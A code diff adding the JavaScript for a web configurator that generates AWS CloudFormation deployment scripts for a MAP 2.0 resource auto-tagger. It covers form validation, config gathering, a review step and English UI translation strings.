+            const list = document.getElementById('vpcList');
+            const row = document.createElement('div');
+            row.className = 'entry-row';
+            const input = document.createElement('input');
+            input.type = 'text'; input.className = 'vpc-input';
+            input.placeholder = 'vpc-0abc1234def56789';
+            input.addEventListener('blur', () => validateVpcInput(input));
+            input.addEventListener('input', () => validateVpcInput(input));
+            const btn = document.createElement('button');
+            btn.className = 'btn-remove'; btn.title = 'Remove';
+            btn.onclick = function(){ removeEntry(this); };
+            btn.textContent = '×';
+            row.appendChild(input); row.appendChild(btn);
+            list.appendChild(row);
+        }
+
+        function addRegion() {
+            const list = document.getElementById('regionList');
+            const firstSelect = list.querySelector('.region-select');
+            const selected = new Set([...list.querySelectorAll('.region-select')].map(s => s.value).filter(v => v));
+            const select = document.createElement('select');
+            select.className = 'region-select';
+            [...firstSelect.options].forEach(opt => {
+                if (!selected.has(opt.value)) {
+                    select.appendChild(opt.cloneNode(true));
+                }
+            });
+            const btn = document.createElement('button');
+            btn.className = 'btn-remove'; btn.title = 'Remove'; btn.onclick = function(){ removeEntry(this); };
+            btn.textContent = '×';
+            const row = document.createElement('div');
+            row.className = 'entry-row';
+            row.appendChild(select); row.appendChild(btn);
+            list.appendChild(row);
+        }
+
+        function addSingleRegion() {
+            const list = document.getElementById('singleRegionList');
+            const firstSelect = list.querySelector('.region-select');
+            const selected = new Set([...list.querySelectorAll('.region-select')].map(s => s.value).filter(v => v));
+            const select = document.createElement('select');
+            select.className = 'region-select';
+            [...firstSelect.options].forEach(opt => {
+                if (!selected.has(opt.value)) {
+                    select.appendChild(opt.cloneNode(true));
+                }
+            });
+            const btn = document.createElement('button');
+            btn.className = 'btn-remove'; btn.title = 'Remove'; btn.onclick = function(){ removeEntry(this); };
+            btn.textContent = '×';
+            const row = document.createElement('div');
+            row.className = 'entry-row';
+            row.appendChild(select); row.appendChild(btn);
+            list.appendChild(row);
+        }
+
+        function removeEntry(btn) {
+            const list = btn.parentElement.parentElement;
+            if (list.children.length > 1) btn.parentElement.remove();
+        }
+
+        function getValues(selector) {
+            return Array.from(document.querySelectorAll(selector)).map(i => i.value.trim()).filter(v => v);
+        }
+
+
+        // --- Validation ---
+        function isValidCalendarDate(dateStr) {
+            if (!dateStr) return false;
+            const [y, m, d] = dateStr.split('-').map(Number);
+            const dt = new Date(y, m - 1, d);
+            return dt.getFullYear() === y && dt.getMonth() === m - 1 && dt.getDate() === d;
+        }
+
+        function validate() {
+            let valid = true;
+            const mpeId = document.getElementById('mpeId').value.trim();
+            const date = document.getElementById('agreementDate').value;
+
+            if (!/^[A-Z0-9]+$/.test(mpeId) || mpeId.length < 1 || mpeId.length > 44) {
+                document.getElementById('mpeId').classList.add('error');
+                document.getElementById('mpeId-error').style.display = 'block';
+                valid = false;
+            } else {
+                document.getElementById('mpeId').classList.remove('error');
+                document.getElementById('mpeId-error').style.display = 'none';
+            }
+
+            if (!date || !isValidCalendarDate(date)) {
+                document.getElementById('agreementDate').classList.add('error');
+                document.getElementById('agreementDate-error').style.display = 'block';
+                valid = false;
+            } else {
+                document.getElementById('agreementDate').classList.remove('error');
+                document.getElementById('agreementDate-error').style.display = 'none';
+            }
+
+            const endDate = document.getElementById('agreementEndDate').value;
+            if (!endDate || !isValidCalendarDate(endDate) || endDate <= date) {
+                document.getElementById('agreementEndDate').classList.add('error');
+                document.getElementById('agreementEndDate-error').style.display = 'block';
+                valid = false;
+            } else {
+                document.getElementById('agreementEndDate').classList.remove('error');
+                document.getElementById('agreementEndDate-error').style.display = 'none';
+            }
+
+            if (!document.querySelector('input[name="deployMode"]:checked')) {
+                document.getElementById('opt-single').style.outline = '2px solid #d13212';
+                document.getElementById('opt-multi').style.outline = '2px solid #d13212';
+                valid = false;
+            } else {
+                document.getElementById('opt-single').style.outline = '';
+                document.getElementById('opt-multi').style.outline = '';
+            }
+
+            // Account scope: at least one account ID required, no duplicates
+            // Only validate if multi-account mode is active (checkbox may stay checked when switching modes)
+            const currentMode = (document.querySelector('input[name="deployMode"]:checked') || {}).value;
+            const useAcctScope = document.getElementById('useAccountScope');
+            if (currentMode === 'multi' && useAcctScope && useAcctScope.checked) {
+                const acctVals = getValues('.stackset-account-id').filter(v => v.trim());
+                const acctErr = document.getElementById('account-scope-error');
+                const dupeAcct = acctVals.length !== new Set(acctVals).size;
+                const invalidAcct = acctVals.some(v => v && !/^\d{12}$/.test(v));
+                document.querySelectorAll('.stackset-account-id').forEach(el => validateAccountInput(el));
+                const acctKey = acctVals.length === 0 ? 'err_account_scope_required' : (invalidAcct ? 'err_account_format' : (dupeAcct ? 'err_duplicate_account' : null));
+                if (acctKey) {
+                    acctErr.setAttribute('data-i18n', acctKey);
+                    acctErr.textContent = t(acctKey);
+                    acctErr.style.display = 'block';
+                    valid = false;
+                } else {
+                    acctErr.setAttribute('data-i18n', 'err_account_scope_required');
+                    acctErr.style.display = 'none';
+                }
+            }
+
+            // VPC scope: at least one VPC ID required, no duplicates
+            // Only validate if single-account mode is active (checkbox may stay checked when switching modes)
+            if (currentMode === 'single' && document.getElementById('useVpcScope').checked) {
+                const vpcVals = getValues('.vpc-input').filter(v => v.trim());
+                const vpcErr = document.getElementById('vpc-error');
+                const dupeVpc = vpcVals.length !== new Set(vpcVals).size;
+                const invalidVpc = vpcVals.some(v => v && !/^vpc-[0-9a-f]{8,17}$/.test(v));
+                document.querySelectorAll('.vpc-input').forEach(el => validateVpcInput(el));
+                const vpcKey = vpcVals.length === 0 ? 'err_vpc_required' : (invalidVpc ? 'err_vpc_format' : (dupeVpc ? 'err_duplicate_vpc' : null));
+                if (vpcKey) {
+                    vpcErr.setAttribute('data-i18n', vpcKey);
+                    vpcErr.textContent = t(vpcKey);
+                    vpcErr.style.display = 'block';
+                    valid = false;
+                } else {
+                    vpcErr.setAttribute('data-i18n', 'err_vpc_required');
+                    vpcErr.style.display = 'none';
+                }
+            }
+
+            return valid;
+        }
+
+        // --- Config gathering ---
+        function getConfig() {
+            const deployModeEl = document.querySelector('input[name="deployMode"]:checked');
+            const deployMode = deployModeEl ? deployModeEl.value : '';
+            const useVpcScope = document.getElementById('useVpcScope').checked;
+            const tagNonVpcServices = document.getElementById('tagNonVpcServices').checked;
+
+            const config = {
+                mpeId: 'mig' + document.getElementById('mpeId').value.trim(),
+                agreementDate: document.getElementById('agreementDate').value,
+                agreementEndDate: document.getElementById('agreementEndDate').value,
+                alertEmail: document.getElementById('alertEmail').value.trim(),
+                customerName: document.getElementById('customerName').value.trim(),
+                deployMode,
+                scopeMode: useVpcScope ? 'vpc' : 'account',
+                scopedVpcIds: useVpcScope ? [...new Set(getValues('.vpc-input').map(v => v.trim()).filter(v => v))] : ['NONE'],
+                tagNonVpcServices,
+                includeBackfill: document.getElementById('includeBackfill').checked,
+            };
+
+            if (deployMode === 'single') {
+                const singleRegions = getValues('#singleRegionList .region-select');
+                config.regions = [...new Set(singleRegions.length > 0 ? singleRegions : ['ap-northeast-2'])];
+            } else if (deployMode === 'multi') {
+                config.regions = [...new Set(getValues('.region-select'))];
+                config.useAccountScope = document.getElementById('useAccountScope').checked;
+                const ssIds = document.querySelectorAll('.stackset-account-id');
+                const ssLabels = document.querySelectorAll('.stackset-account-label');
+                config.stacksetAccounts = [];
+                const seenIds = new Set();
+                ssIds.forEach((input, i) => {
+                    const id = input.value.trim();
+                    const label = ssLabels[i] ? ssLabels[i].value.trim() : '';
+                    if (id && !seenIds.has(id)) {
+                        seenIds.add(id);
+                        config.stacksetAccounts.push({ id, label: label || id });
+                    }
+                });
+            }
+
+            return config;
+        }
+
+        // --- Step navigation ---
+        function setStep(num) {
+            ['step1', 'step2', 'step3'].forEach((id, i) => {
+                document.getElementById(id).classList.toggle('hidden', i + 1 !== num);
+                const ind = document.getElementById(id + '-indicator');
+                ind.classList.remove('active', 'done');
+                if (i + 1 < num) ind.classList.add('done');
+                if (i + 1 === num) ind.classList.add('active');
+            });
+        }
+
+        function backToConfig() { setStep(1); }
+
+        // --- Review ---
+        function reviewConfig() {
+            if (!validate()) return;
+            const config = getConfig();
+            const table = document.getElementById('reviewTable');
+
+            const rows = [
+                [t('r_customer'), config.customerName || t('rv_not_specified')],
+                [t('ui_mpe_tag'), config.mpeId],
+                [t('ui_agree_start'), config.agreementDate],
+                [t('ui_agree_end'), config.agreementEndDate],
+                [t('ui_alert_email'), config.alertEmail || t('rv_none')],
+                [t('ui_deploy_mode'), config.deployMode === 'single' ? t('ui_single_title') : t('ui_multi_title')],
+            ];
+
+            if (config.regions && config.regions.length > 0) {
+                rows.push([t('ui_deployment_regions'), config.regions.join(', ')]);
+            }
+
+            if (config.deployMode === 'multi') {
+                if (config.useAccountScope) {
+                    const acctDisplay = (config.stacksetAccounts || []).map(a => `${a.id}${a.label !== a.id ? ' (' + a.label + ')' : ''}`).join('<br>');
+                    rows.push([t('rv_target_accounts'), acctDisplay || t('rv_none_specified')]);
+                } else {
+                    rows.push([t('rv_target_accounts'), t('rv_targets_all')]);
+                }
+            }
+
+            if (config.scopeMode === 'vpc') {
+                rows.push([t('ui_vpc_ids'), config.scopedVpcIds.join(', ')]);
+                rows.push([t('rv_tag_non_vpc'), config.tagNonVpcServices ? t('rv_yes') : t('rv_no')]);
+            } else {
+                rows.push([t('ui_tagging_scope'), t('rv_all_resources')]);
+            }
+
+            rows.push([t('ui_backfill_title'), config.includeBackfill ? t('rv_backfill_enabled') : t('rv_disabled')]);
+
+            // Safe DOM construction: v may contain user-controlled values
+            // (customer name, email, account IDs, VPC IDs) so use textContent
+            // rather than innerHTML template-literal interpolation. Preserves
+            // the main-deploy styles (width 200px, v-cell monospace 13px).
+            // (§1.94, 21.0.6)
+            table.replaceChildren();
+            rows.forEach(([k, v]) => {
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = '1px solid #eaeded';
+                const td1 = document.createElement('td');
+                td1.style.padding = '8px';
+                td1.style.fontWeight = '600';
+                td1.style.width = '200px';
+                td1.style.verticalAlign = 'top';
+                td1.textContent = k;
+                const td2 = document.createElement('td');
+                td2.style.padding = '8px';
+                td2.style.fontFamily = 'monospace';
+                td2.style.fontSize = '13px';
+                td2.textContent = v;
+                tr.append(td1, td2);
+                table.appendChild(tr);
+            });
+
+            const desc = document.getElementById('deployDescription');
+            const templateListEl = document.getElementById('templateList');
+
+            const baseResources = `
+                <tr style="border-bottom:1px solid #eaeded;"><td style="padding:8px;font-weight:600;">${t('rv_res_lambda')}</td><td style="padding:8px;">${t('rv_res_lambda_desc')}</td></tr>
+                <tr style="border-bottom:1px solid #eaeded;"><td style="padding:8px;font-weight:600;">${t('rv_res_eventbridge')}</td><td style="padding:8px;">${t('rv_res_eventbridge_desc')}</td></tr>
+                <tr style="border-bottom:1px solid #eaeded;"><td style="padding:8px;font-weight:600;">${t('rv_res_ssm')}</td><td style="padding:8px;">${t('rv_res_ssm_desc')}</td></tr>
+                <tr style="border-bottom:1px solid #eaeded;"><td style="padding:8px;font-weight:600;">${t('rv_res_iam')}</td><td style="padding:8px;">${t('rv_res_iam_desc')}</td></tr>
+                <tr style="border-bottom:1px solid #eaeded;"><td style="padding:8px;font-weight:600;">${t('rv_res_dlq')}</td><td style="padding:8px;">${t('rv_res_dlq_desc')}</td></tr>
+                <tr style="border-bottom:1px solid #eaeded;"><td style="padding:8px;font-weight:600;">${t('rv_res_sns')}</td><td style="padding:8px;">${t('rv_res_sns_desc')}</td></tr>`;
+
+            if (config.deployMode === 'single') {
+                desc.textContent = t('rv_desc_single');
+                templateListEl.innerHTML = `<table style="width:100%;font-size:14px;border-collapse:collapse;">${baseResources}</table>`;
+            } else {
+                const accts = config.stacksetAccounts || [];
+                const scopeDesc = accts.length > 0
+                    ? `${t('rv_targets')} ${accts.length} ${t('rv_specific_accounts')}: ${accts.map(a=>a.id).join(', ')}`
+                    : t('rv_targets_all');
+                desc.textContent = t('rv_desc_stackset');
+                templateListEl.innerHTML = `<table style="width:100%;font-size:14px;border-collapse:collapse;">
+                    <tr style="border-bottom:1px solid #eaeded;background:#f2f8fd;"><td style="padding:8px;font-weight:600;" colspan="2">📄 map-auto-tagger-org-${config.mpeId}.yaml — ${t('rv_deploy_mgmt')}</td></tr>
+                    <tr style="border-bottom:1px solid #eaeded;"><td style="padding:8px;font-weight:600;padding-left:20px;">${t('rv_res_custom')}</td><td style="padding:8px;">${t('rv_res_custom_desc')}</td></tr>
+                    <tr style="border-bottom:1px solid #eaeded;"><td style="padding:8px;font-weight:600;padding-left:20px;">AWS::CloudFormation::StackSet</td><td style="padding:8px;">${scopeDesc}</td></tr>
+                    <tr style="border-bottom:1px solid #eaeded;background:#f2f8fd;"><td style="padding:8px;font-weight:600;" colspan="2">📄 map-auto-tagger-accounts-${config.mpeId}.yaml — ${t('rv_deploy_accounts')}</td></tr>
+                    ${baseResources}
+                    </table>`;
+            }
+
+            setStep(2);
+        }
+
+        // --- Template generation ---
+
+        // ── i18n ─────────────────────────────────────────────────────────────
+        let currentLang = 'en';
+
+        const LANG_LABELS = { en:'English', ko:'한국어', ja:'日本語', zh:'中文简体', id:'Bahasa Indonesia', th:'ภาษาไทย', vi:'Tiếng Việt' };
+
+        const TRANSLATIONS = {
+          en: {
+            // UI
+            ui_title:'MAP 2.0 Auto-Tagger Configurator',
+            ui_btn_download:'Download',
+            ui_instr_opt1_title:'Option 1: AWS CloudShell (Recommended)',
+            ui_instr_opt2_title:'Option 2: Local AWS CLI',
+            ui_instr_cli_prereq_single:'Verify AWS CLI v2 is installed and configured with your migration account credentials.',
+            ui_instr_cli_prereq_multi:'Verify AWS CLI v2 is installed and configured with your management account credentials.',
+            ui_instr_cli_download:'Download deploy.sh to your computer.',
+            ui_instr_cli_download_all:'Download all 3 files to your computer.',
+            ui_instr_cli_terminal:'Open a terminal (Linux/macOS) or WSL/Git Bash (Windows).',
+            ui_cli_alt_short:'Configure AWS CLI for the account and run:',
+            ui_instr_single_title:'DEPLOYMENT INSTRUCTIONS — Single Account',
+            ui_instr_multi_title:'DEPLOYMENT INSTRUCTIONS — Multi-Account',
+            ui_instr_login_single:'Log into the AWS Management Console for your migration account.',
+            ui_instr_login_multi:'Log into the AWS Management Console for your MANAGEMENT account.',
+            ui_instr_open_cloudshell:'Open CloudShell (click the terminal icon in the top menu bar).',
+            ui_instr_upload_files:'Upload the files (CloudShell → Actions → Upload file):',
+            ui_instr_upload_all:'Upload all 3 files (CloudShell → Actions → Upload file):',
+            ui_instr_run:'Run:',
+            ui_instr_done_single:'Done. The script deploys and confirms when complete.',
+            ui_instr_done_multi:'Done. Auto-tagging is now active across all accounts.',
+            ui_instr_verify_title:'Verify tagging is working (after deployment):',
+            ui_instr_expected:'Expected',
+            ui_instr_thats_it:"That's it. Auto-tagging is active for all 140+ supported resource types.",
+            ui_instr_existing_only:'Existing resources are NOT affected — only newly created ones.',
+            ui_instr_auto_handles:'The script handles everything automatically:',
+            ui_instr_uploads_s3:'Uploads templates to S3',
+            ui_instr_enables_stacksets:'Enables StackSets in your organization',
+            ui_instr_discovers_org:'Discovers your org structure',
+            ui_instr_deploys_all:'Deploys to all accounts (~10 minutes)',
+            ui_instr_check_status:'Check status after running',
+            ui_instr_files_received:'You received 3 files',
+            ui_instr_target_accounts:'Target accounts',
+            ui_instr_all_accounts:'(no accounts specified)',
+            ui_instr_all_org:'all accounts in org',
+            ui_instr_cloudtrail_note:'NOTE: CloudTrail must be enabled in each account and target region.',
+            ui_sample_notice_title:'Sample Code Notice:',
+            ui_sample_notice_body:"This is sample code for non-production usage. You are responsible for testing, securing, and optimizing this solution to meet your organization's security, regulatory, and compliance requirements before deployment. Deploying this solution may incur AWS charges for AWS Lambda, Amazon EventBridge, Amazon CloudWatch, Amazon SNS, Amazon SQS, and AWS Systems Manager. See the",
+            ui_shared_responsibility:'AWS Shared Responsibility Model',
+            ui_btn_copy:'Copy Instructions',
+            ui_one_file_step:'One file. One step.',
+            ui_send_script:'Send',
+            ui_to_customer:'to the customer.',
+            ui_cloudshell_open:'They open',
+            ui_in_account:'in the',
+            ui_upload_and_run:'upload this file, and run',
+            ui_mgmt_account:'management account',
+            ui_migration_account_label:'migration account',
+            d_log_pass:'PASS:',
+            d_log_fail:'FAIL:',
+            d_log_warn:'WARN:',
+            ui_main_desc1:'Generates a CloudFormation template that auto-tags new AWS resources with',
+            ui_main_desc2:'within',
+            ui_main_desc3:'typically 60-90 seconds (up to 15 minutes during high-volume activity)',
+            ui_main_desc4:'of creation.',
+            ui_main_desc5:'Covers',
+            ui_main_desc6:'resource types across all major AWS services (CT org E2E tested).',
+            ui_main_desc7:'Customer cost:',
+            ui_step1:'1. Configure', ui_step2:'2. Review', ui_step3:'3. Download',
+            ui_card_deal_title:'MAP 2.0 Deal Details',
+            ui_card_deal_subtitle:'Enter the MAP agreement details from AWS Investments',
+            ui_customer_name:'Customer Name', ui_customer_name_hint:'(used for filename generation only)',
+            ui_customer_name_placeholder:'e.g., Acme Corp',
+            ui_mpe_tag:'MAP Engagement ID',
+            ui_mpe_hint:'(10-character alphanumeric code from AWS Investments — e.g., A1B2C3D4E5)',
+            ui_agree_start:'Agreement Start Date', ui_agree_start_hint:'(Date to start tagging newly created MAP 2.0 resources)',
+            ui_agree_end:'Agreement End Date', ui_agree_end_hint:'(Date to stop tagging newly created resources)',
+            ui_alert_email:'Alert Email', ui_alert_email_hint:'(optional — email to receive tagging failure alerts)',
+            ui_alert_email_missing_warn:'⚠️ No alert email set. Tagging failures (IAM deny, tag-quota, service drift) will be silently dropped — no SNS, no DLQ alarm destination. You can add a subscriber later via scripts/add_subscriber.sh or re-run the configurator.\n\nProceed without an alert subscriber?',
+            ui_email_confirm_hint:'Customer must confirm the AWS subscription email after deployment.',
+            ui_deploy_mode:'Deployment Mode', ui_deploy_mode_subtitle:'How many AWS accounts are used for migration?',
+            ui_single_title:'Single Account', ui_single_desc:'Migration workloads in one AWS account. Deploy the stack once. Done in 2 minutes.',
+            ui_multi_title:'Multiple Accounts (AWS Organizations)', ui_multi_desc:'Customer has multiple linked accounts under an AWS Organization. One StackSet command deploys to all accounts simultaneously.',
+            ui_backfill_title:'One-Time Backfill', ui_optional:'(optional)',
+            ui_coverage_title:'What Gets Tagged',
+            ui_btn_next:'Review Configuration →', ui_btn_back:'← Back', ui_btn_generate:'Generate & Download →',
+            ui_tagging_scope:'Tagging Scope', ui_vpc_scope_hint:'By default all new resources in the account are tagged. Use VPC scoping if migration and non-migration workloads share the same account.',
+            ui_vpc_limit:'Limit tagging to specific VPCs only',
+            ui_tag_non_vpc:'Also tag non-VPC resources (Amazon S3, Amazon DynamoDB, AWS Lambda, Amazon SNS, Amazon SQS, etc.)',
+            ui_tag_non_vpc_hint:'These services have no VPC association. Check to tag them all regardless of VPC scope (recommended for MAP eligibility).',
+            ui_vpc_ids:'VPC IDs', ui_vpc_ids_hint:'(only VPC-bound resources in these VPCs are tagged)',
+            ui_add_vpc:'+ Add another VPC', ui_add_account:'+ Add another account', ui_add_region:'+ Add another region',
+            ui_migration_account_ids:'Migration Account IDs', ui_migration_account_ids_hint:'(for reference — the stack deploys to the entire org automatically)',
+            ui_stackset_note:'The AWS Lambda function is deployed to every account in your org via the root OU. By default, all accounts\' resources are tagged. You can optionally limit tagging to specific accounts below.',
+            ui_stackset_bucket_note:'ⓘ This deployment creates a temporary S3 bucket (auto-map-tagger-{account-id}) to stage CloudFormation templates for the StackSet. The bucket is retained after deployment as the StackSet requires it to deploy to new accounts that join your organization in the future.',
+            ui_account_limit:'Limit tagging to specific accounts only',
+            ui_central_account_id:'Central Account ID', ui_central_account_id_hint:'(where the Lambda will be deployed)',
+            ui_member_accounts:'Member Accounts in MAP Scope',
+            ui_deployment_region_single:'Deployment Region',
+            ui_deployment_regions:'Deployment Regions', ui_deployment_regions_hint:'(regions where the customer creates resources)',
+            ui_backfill_strong:'Tag existing resources created since agreement start date',
+            ui_backfill_scope_note:'✓ Scoping applied: backfill follows the same VPC / account scope settings selected above.',
+            ui_backfill_desc:'Deploys a one-time AWS Lambda function that queries CloudTrail history from your agreement start date and tags all matching resources created before this solution was deployed. Runs automatically ~5 minutes after deployment.',
+            ui_backfill_note:'Note: CloudTrail history is limited to the last 90 days. Resources created before that window must be tagged manually.',
+            ui_coverage_subtitle:'140+ resource types with explicit handlers — verified across 9 accounts',
+            ui_review_title:'Review Configuration', ui_review_subtitle:'Verify settings before generating the template',
+            ui_what_deployed:'What Gets Deployed',
+            ui_template_ready:'Template Ready', ui_template_ready_subtitle:'Share this with the customer along with the deployment instructions below',
+            ui_prereq_title:'Customer Prerequisites', ui_prereq_subtitle:'the generated deploy.sh verifies these automatically before deploying:',
+            ui_prereq_cloudtrail:'CloudTrail must be enabled in the target region(s)',
+            ui_prereq_perms:'Deployer must have AWS CloudFormation permissions (IAM, AWS Lambda, Amazon EventBridge, AWS Systems Manager, Amazon SNS, Amazon SQS, Amazon CloudWatch)',
+            ui_prereq_org:'Management account must have AWS Organizations enabled with CloudFormation StackSets trusted access',
+            ui_scp_title:'⚠️ Service Control Policy (SCP) Advisory',
+            ui_scp_intro:'If the customer\'s organization uses SCPs, verify the following before deployment:',
+            ui_deploy_instructions:'Customer Deployment Instructions',
+            ui_template_preview:'Template Preview',
+            ui_download_template:'Download CloudFormation Template',
+            ui_download_template_note:'Optional — for customers who would like to review the CloudFormation code before deploying.',
+            ui_start_over:'Start Over',
+            ui_cost_note:'Estimated monthly cost: ', ui_cost_note2:' per account (AWS Lambda invocations + Amazon CloudWatch). No AWS Config required.',
+            ui_scp_tagging:"Tagging SCPs — verify SCPs do not deny tag:TagResources, ec2:CreateTags, or other tagging actions for Lambda execution roles. The deploy.sh runs a post-deployment IAM simulation check, but SCPs require manual verification in the AWS Organizations console.",
+            ui_scp_mandatory:"Mandatory tagging SCPs — if SCPs require tags at resource creation time, this solution does not satisfy that requirement (tags are applied 60-90 seconds after creation). The customer must exempt the tag key map-migrated from creation-time enforcement, or use a grace period.",
+            rv_not_specified:'(not specified)', rv_none:'(none)', rv_none_specified:'(none specified)',
+            rv_yes:'Yes', rv_no:'No', rv_disabled:'Disabled', rv_enabled:'Enabled',
+            rv_multi_method:'Multi-Account Method', rv_stackset:'StackSet (per-account Lambda)', rv_central:'Central Lambda (cross-account)',
+            rv_target_accounts:'Target Accounts', rv_tag_non_vpc:'Tag non-VPC services',
+            rv_all_resources:'All resources in target account(s)',
+            rv_backfill_enabled:'Enabled — tags existing resources since agreement start date (~5 min after deploy)',
+            rv_desc_single:"One CloudFormation stack. Deploy directly in the customer's account:",
+            rv_desc_stackset:'Two files generated. Deploy the management account template once — it auto-discovers your org structure and provisions the specified accounts:',
+            rv_desc_central:'Central Lambda in one account + cross-account IAM role in each member account:',
+            rv_deploy_mgmt:'deploy to management account', rv_deploy_accounts:'uploaded to S3, deployed to each account',
+            rv_targets:'Targets', rv_specific_accounts:'specific account(s)', rv_targets_all:'Targets ALL accounts in the organization',
+            rv_res_lambda:'AWS Lambda Function', rv_res_lambda_desc:'Auto-tags new resources within 60–90 sec of creation',
+            rv_res_eventbridge:'Amazon EventBridge Rule', rv_res_eventbridge_desc:'Captures 200+ Create/Run/Put/Publish events across all services',
+            rv_res_ssm:'AWS Systems Manager Parameter', rv_res_ssm_desc:'Stores MAP Engagement ID, agreement date, scope config',
+            rv_res_iam:'IAM Role', rv_res_iam_desc:'100+ service-specific tagging permissions, least-privilege',
+            rv_res_dlq:'Amazon SQS Dead Letter Queue', rv_res_dlq_desc:'Captures failed tagging events for retry/audit',
+            rv_res_sns:'Amazon SNS Topic + Amazon CloudWatch Alarm', rv_res_sns_desc:'Notifies on tagging errors (>3 failures in 5 min)',
+            rv_res_custom:'Custom Resource (Lambda)', rv_res_custom_desc:'Auto-discovers root OU ID at deploy time — customer does nothing',
+            err_mpe_invalid:"MAP Engagement ID must be exactly 10 characters, uppercase English letters (A–Z) and digits (0–9) only, with at least one letter and one number",
+            ui_landing_title:'What would you like to do?',
+            ui_landing_subtitle:'Select an option to get started',
+            ui_mode_deploy_title:'Deploy new MAP Auto-Tagger',
+            ui_mode_deploy_desc:'Generate a deployment script for a new MAP 2.0 engagement. Works for single-account and multi-account (AWS Organizations) deployments.',
+            ui_mode_edit_title:'Edit existing deployment',
+            ui_mode_edit_desc:'Add or remove AWS accounts from scope on an already-deployed MAP Auto-Tagger. Generates an update script — no full redeployment needed.',
+            ui_mode_edit_note:'Multi-account (AWS Organizations) deployments only',
+            ui_estep1:'1. Configure', ui_estep2:'2. Review', ui_estep3:'3. Download',
+            ui_editor_info:'This tool modifies an existing deployment created by the MAP Auto-Tagger Configurator. It generates an update.sh script that updates the account scope without redeploying.',
+            ui_editor_step1_title:'Deployment Details',
+            ui_editor_step1_subtitle:'Enter the details of your existing MAP Auto-Tagger deployment',
+            ui_editor_mpe_hint:'— 10-character alphanumeric code, must match the original deployment',
+            ui_editor_region:'Deployment Region',
+            ui_editor_region_hint:'— region where the management stack was deployed',
+            ui_editor_region_placeholder:'Select a region...',
+            err_editor_region:'Please select a deployment region',
+            ui_editor_action_title:'Action',
+            ui_editor_action_subtitle:'Choose whether to add or remove accounts from the MAP scope',
+            ui_editor_add_title:'Add accounts to MAP scope',
+            ui_editor_add_desc:'Selected accounts will start being tagged with the MAP tag.',
+            ui_editor_add_accounts_label:'Account IDs to add',
+            ui_editor_add_accounts_hint:'— only accounts not currently in scope',
+            err_editor_account:'Please enter at least one valid 12-digit account ID',
+            ui_editor_backfill_title:'Re-run backfill for newly added accounts',
+            ui_editor_backfill_desc:'Queries CloudTrail history from the agreement start date and tags existing resources in the newly added accounts. Runs automatically during the StackSet update. Results appear in CloudWatch Logs (map-auto-tagger-backfill).',
+            ui_editor_backfill_note:'Note: CloudTrail history is limited to the last 90 days. Resources created before that window must be tagged manually.',
+            ui_editor_remove_title:'Remove accounts from MAP scope',
+            ui_editor_remove_desc:'Selected accounts will stop being tagged. Existing tags are not removed. The Lambda remains deployed but inactive for these accounts.',
+            ui_editor_remove_accounts_label:'Account IDs to remove',
+            ui_editor_remove_accounts_hint:'— only accounts currently in scope',
+            ui_mode_update_title:'Update to latest template version',
+            ui_mode_update_desc:'Upgrade Lambda code, IAM policy, and EventBridge rules to the current template version. Scope configuration (accounts, VPCs, agreement date) is preserved. Auto-detects single-account and multi-account deployments.',
+            ui_ustep1:'1. Configure',
+            ui_ustep2:'2. Review',
+            ui_ustep3:'3. Download',
+            ui_update_info:'This tool upgrades an existing MAP Auto-Tagger deployment to the latest template version. It generates an <code>upgrade.sh</code> script that preserves scope configuration and auto-detects single-account and multi-account deployments.',
+            ui_update_step1_title:'Deployment Details',
+            ui_update_step1_subtitle:'Enter the region and optional scope for the upgrade',
+            ui_update_info_detail:'The generated <code>upgrade.sh</code> reads the current template version from SSM Parameter Store (<code>/auto-map-tagger/&lt;mpe&gt;/version</code>), compares it to the target version, and refuses cross-major upgrades (e.g. v19 → v21) without <code>--force</code>. Customer action is only required for MAJOR bumps per SemVer.',
+            ui_update_scope_title:'Update only specific MAP engagement(s)',
+            ui_update_scope_desc:'Leave unchecked to update every MAP Auto-Tagger deployment the script finds in this account (both stacks and stacksets matching <code>map-auto-tagger-mig*</code>).',
+            ui_update_mpe_label:'MPE IDs to update',
+            ui_update_mpe_hint:'— each must match a deployed MAP Auto-Tagger in this region',
+            ui_update_add_mpe:'+ Add another MPE',
+            err_update_mpe:'Please enter at least one valid 10-character MPE ID',
+            ui_update_scope_review:'Update scope',
+            ui_update_all_review:'all MAP Auto-Tagger deployments in this account',
+            ui_update_target_version:'Target template version',
+            ui_update_confirm_text:'I confirm that the listed MAP Auto-Tagger deployment(s) exist in the selected region and that upgrading them to the target template version is intended.',
+            ui_update_confirm_risk:'An upgrade replaces the Lambda code, IAM policy, and EventBridge rules in every matched stack. Scope and agreement dates are preserved by carrying over each existing CFN parameter value, but a failed rollout may leave a stack in UPDATE_ROLLBACK_COMPLETE state requiring manual recovery.',
+            err_update_confirm:'You must confirm before generating the update script',
+            ui_update_step3_subtitle:'Run this in AWS CloudShell from the account where the deployment was made',
+            ui_version_history_title:'Version history — what changed?',
+            ui_version_released:'Released',
+            ui_version_current:'Current target',
+            ui_version_full_changelog:'Full changelog on GitHub',
+            ui_version_tag_bugfix:'Bug fix',
+            ui_version_tag_coverage:'New coverage',
+            ui_version_tag_breaking:'Breaking',
+            ui_version_tag_security:'Security',
+            ui_version_tag_perf:'Performance',
+            ui_version_tag_other:'Other',
+            ui_editor_back:'← Back',
+            ui_editor_review:'Review →',
+            ui_editor_review_title:'Review Configuration',
+            ui_editor_review_subtitle:'Verify your settings before generating the update script',
+            ui_editor_review_accounts:'Accounts',
+            ui_editor_confirm_text:'I confirm that a MAP Auto-Tagger has already been deployed in the selected region using the specified MPE ID, and that both values are correct.',
+            ui_editor_confirm_risk:'Generating and running this script with incorrect information may update the wrong StackSet, corrupt the account scope, or cause resources to be tagged with the wrong MAP engagement ID — resulting in lost MAP credits that cannot be recovered retroactively.',
+            err_editor_confirm:'You must confirm before generating the update script',
+            ui_editor_generate:'Generate update.sh →',
+            ui_editor_step3_title:'Script Ready',
+            ui_editor_step3_subtitle:'Run this in AWS CloudShell from the management account',
+            ui_editor_download:'⬇ Download update.sh',
+            ui_upgrade_generate:'Generate upgrade.sh →',
+            ui_upgrade_download:'⬇ Download upgrade.sh',
+            ui_mode_delete_title:'Delete existing deployment',
+            ui_mode_delete_desc:'Remove MAP Auto-Tagger deployments from the account. By default deletes every <code>map-auto-tagger-mig*</code> stack and stackset in the region; optionally scope to specific MPE(s). The <code>map-migrated</code> tag is not removed from already-tagged resources.',
+            ui_dstep1:'1. Configure',
+            ui_dstep2:'2. Review',
+            ui_dstep3:'3. Download',
